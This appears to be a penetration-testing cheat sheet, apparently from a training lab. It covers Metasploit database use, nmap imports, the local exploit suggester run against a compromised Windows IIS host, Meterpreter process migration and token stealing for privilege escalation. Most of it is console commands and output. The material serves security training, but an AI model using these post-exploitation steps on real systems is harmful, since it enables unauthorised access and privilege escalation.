## Databases
### MSF - Initiate a Database
```shell
sudo msfdb init
```
To see what else we can do with Workspaces, we can use the `workspace -h` command for the help menu related to Workspaces.
```shell
msf6 > workspace -h

Usage:
    workspace                  List workspaces
    workspace -v               List workspaces verbosely
    workspace [name]           Switch workspace
    workspace -a [name] ...    Add workspace(s)
    workspace -d [name] ...    Delete workspace(s)
    workspace -D               Delete all workspaces
    workspace -r     Rename workspace
    workspace -h               Show this help information
```
### Importing Scan Results from NMAP
```shell
msf6 > db_import Target.xml
```

#### MSF - Nmap
```shell
msf6 > db_nmap -sV -sS 10.10.10.8
```
#### MSF - DB Export
```shell
msf6 > db_export -h
```
## Local exploit suggester
```shell
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```
## Migrate meterpreter
### MSF - Meterpreter Migration
```shell
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    
```

To migrate the Meterpreter session to another process, you can use the following steps:

1. **Identify a Suitable Process:**
   - Look for a stable process that is less likely to be terminated. System processes or services are often good candidates.

2. **Migrate to the Process:**
   - Use the `migrate` command followed by the Process ID (PID) of the target process.
   ```shell
   meterpreter > migrate <PID>
   ```

3. **Verify Migration:**
   - After migration, you can verify the current user context with:
   ```shell
   meterpreter > getuid
   ```

4. **Steal a Token (Optional):**
   - If you need to escalate privileges, you might attempt to steal a token from a process running under a higher privilege:
   ```shell
   meterpreter > steal_token <PID>
   ```

5. **Verify the New User Context:**
   - Check the new user context after stealing a token:
   ```shell
   meterpreter > getuid
   ```

6. **Example of Token Stealing:**
   ```shell
   meterpreter > steal_token 1836

   Stolen token with username: NT AUTHORITY\NETWORK SERVICE

   meterpreter > getuid

   Server username: NT AUTHORITY\NETWORK SERVICE
   ```

By migrating to a stable process and potentially stealing a token, you can maintain persistence and possibly escalate privileges within the target system. Always ensure you have the necessary permissions to perform these actions legally and ethically.